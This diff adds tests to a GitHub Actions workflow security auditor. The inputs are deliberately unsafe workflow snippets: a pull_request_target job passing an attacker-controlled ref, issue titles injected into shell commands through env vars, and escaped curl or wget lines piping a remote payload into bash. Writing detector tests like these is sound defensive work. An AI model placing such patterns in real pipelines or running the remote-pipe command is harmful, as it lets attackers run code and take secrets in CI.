@@ -366,3 +366,34 @@ test('CONTRACT: structural and heuristic auditors agree on 96 generated download
  }
  assert.equal(cases,96);
 });
+
+test('Codex P1: reusable workflow cannot pass attacker-controlled ref without review',()=>{
+ const source=['on: pull_request_target','jobs:','  caller:',
+ '    uses: ./.github/workflows/reusable.yml','    with:',
+ '      ref: ${{ github.event.pull_request.head.sha }}'].join('\n');
+ const actual=inspectWorkflow(source);
+ assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify(actual));
+ assert.ok(actual.coverage.partial||actual.findings.some(x=>x.severity==='BLOCKER'),JSON.stringify(actual));
+});
+test('Codex P1: untrusted event env values never become a clean executable workflow',()=>{
+ const layouts=[
+ ['env:','  CMD: ${{ github.event.issue.title }}','jobs:','  audit:'],
+ ['jobs:','  audit:','    env:','      CMD: ${{ github.event.issue.title }}'],
+ ['jobs:','  audit:','    steps:','      - run: $CMD','        env:','          CMD: ${{ github.event.issue.title }}']
+ ];
+ for(let i=0;i<layouts.length;i++){
+  const src=i===0?['on: issues',...layouts[i],'    steps:','      - run: $CMD'].join('\n'):
+   i===1?['on: issues',...layouts[i],'    steps:','      - run: $CMD'].join('\n'):
+   ['on: issues',...layouts[i]].join('\n');
+  const actual=inspectWorkflow(src);
+  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({i,actual}));
+ }
+});
+test('Codex P1: escaped downloader spellings cannot hide a remote pipe from AST',()=>{
+ for(const downloader of ['c\\url','w\\get']){
+  const src=['on: push','jobs:','  audit:','    steps:',
+  '      - run: '+downloader+' https://example.invalid/payload | bash'].join('\n');
+  const actual=inspectWorkflow(src);
+  assert.notEqual(actual.status,'NO_RISK_PATTERN',JSON.stringify({downloader,actual}));
+ }
+});
